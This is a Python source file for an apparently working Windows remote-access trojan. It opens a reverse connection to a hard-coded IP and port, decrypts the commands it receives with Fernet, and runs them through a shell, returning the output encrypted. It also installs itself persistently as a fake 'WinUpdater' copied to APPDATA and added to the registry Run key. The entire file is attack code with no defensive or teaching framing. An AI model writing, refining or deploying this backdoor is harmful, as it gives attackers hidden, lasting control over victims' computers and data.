import socket
import subprocess
import os
import sys
import shutil
import winreg
from cryptography.fernet import Fernet

SERVER_IP = '10.57.218.161'
PORT = 9999

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("10.57.218.161", 9999))

# Receive encryption key
key = client.recv(1024)
cipher = Fernet(key)

def enable_persistence():
    try:
        target = os.path.join(os.getenv('APPDATA'), 'winupdater.exe')
        if not os.path.exists(target):
            shutil.copyfile(sys.executable, target)

        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "WinUpdater", 0, winreg.REG_SZ, target)
        winreg.CloseKey(reg_key)

        return "[+] Persistence enabled."
    except Exception as e:
        return f"[!] Persistence error: {e}"

while True:
    try:
        encrypted_command = client.recv(4096)
        if not encrypted_command:
            break

        command = cipher.decrypt(encrypted_command).decode()

        if command == "__enable_persistence__":
            result = enable_persistence()
        elif command.lower() == 'exit':
            break
        else:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            result = result.decode()

        encrypted_result = cipher.encrypt(result.encode())
        client.send(encrypted_result)
    except Exception as e:
        error = cipher.encrypt(str(e).encode())
        client.send(error)

client.close()
